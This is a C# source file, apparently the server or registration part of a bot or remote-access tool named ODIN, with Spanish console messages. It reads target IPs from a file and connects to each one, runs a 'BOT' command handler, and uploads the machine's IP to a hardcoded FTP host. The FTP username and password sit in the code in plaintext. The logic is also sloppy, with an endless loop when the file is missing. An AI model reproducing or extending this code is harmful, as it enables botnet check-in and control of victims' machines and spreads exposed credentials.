using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Net;
namespace ServidorODIN
{
    public class Readers
    {
        private StreamReader Reading;
        private StreamWriter Writing;
        private bool Cicles = false;
        private Readers ODIN;
        public string LocalIP;
        private string local = "isp.txt";
        private NET.HandlerCommands BOT;
        private int port = 80;

        public string GetFileDirectorys()
        {
            string dateDirectory = Directory.GetCurrentDirectory();
            Console.WriteLine("ODIN SE ENCUENTRA EN EL DIRECTORIO, [+]-> {0}", dateDirectory);
            return dateDirectory;
        }
        public string StreamReaders()
        {
            // IPS PROVIDER
            Cicles = true;
            while(Cicles)
            {
                     if (File.Exists(local))
                    {
                    Reading = new StreamReader(local);
                    Console.WriteLine("Archivo Encontrado...");
                    while ((local = Reading.ReadLine()) != null)
                    {
                        Console.WriteLine("[+]-> CONECTADOS A: {0}:{1}", local, port);
                        NET.HandlerConnection SSL = new NET.HandlerConnection();
                        SSL.ConnectionHandler(local, port);
                    }
                    break;
                }
                    else
                        Console.WriteLine("Archivo No encontrado");
                        continue;
            }

            Reading.Close();
            BOT = new NET.HandlerCommands();
            BOT.Handler();
            return local;
        }
        //
        public void StreamWriteOnly(string getIP)
        {
            Writing = new StreamWriter(local);
            Writing.Write(getIP);
            Console.WriteLine("IP, Registrada.");
            Writing.Close();
            BOT = new NET.HandlerCommands();
            BOT.Handler();
        }
        public string Host()
        {
            IPHostEntry host;
            host = Dns.GetHostEntry(Dns.GetHostName());
            foreach (IPAddress ip in host.AddressList)
            {
                if (ip.AddressFamily.ToString() == "InterNetwork")
                {
                    string LocalIP;
                    LocalIP = ip.ToString();
                    ODIN = new Readers();
                    ODIN.StreamWriteOnly(LocalIP);
                }
            }
            BOT = new NET.HandlerCommands();
            BOT.Handler();    
            return LocalIP;
        }
        public string Update()
        {
            WebCamService.FtpClient ISProvider = new WebCamService.FtpClient("ftp.servidorsocketasync.hol.es", "u830782660", "facebook2198");
            ISProvider.Login();
            ISProvider.Upload(local);
            ISProvider.Close();    
            Console.WriteLine("Registrado...");
            BOT = new NET.HandlerCommands();
            BOT.Handler();
            return "";
        }
        
    }
}
